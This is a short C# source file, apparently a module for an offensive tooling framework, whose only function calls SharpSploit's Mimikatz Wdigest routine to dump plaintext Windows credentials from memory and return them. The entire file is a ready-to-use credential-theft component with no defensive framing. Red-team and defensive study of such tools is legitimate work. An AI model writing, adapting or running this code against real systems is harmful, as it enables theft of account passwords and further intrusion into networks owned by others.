using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
public static class Wdigest
{
    public static string Execute()
    {
        try
        {
            return SharpSploit.Credentials.Mimikatz.Wdigest();
        }
        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
    }
}
}